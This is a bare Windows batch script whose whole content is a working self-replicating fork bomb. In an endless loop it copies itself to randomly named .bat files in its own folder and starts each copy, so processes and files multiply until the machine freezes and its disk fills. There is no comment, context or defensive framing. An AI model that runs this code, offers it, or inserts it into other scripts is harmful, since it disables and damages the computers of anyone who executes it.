:loop
set "name=%~dp0%random%%random%.bat"
copy "%~f0" "%name%"
start "" "%name%"
goto loop
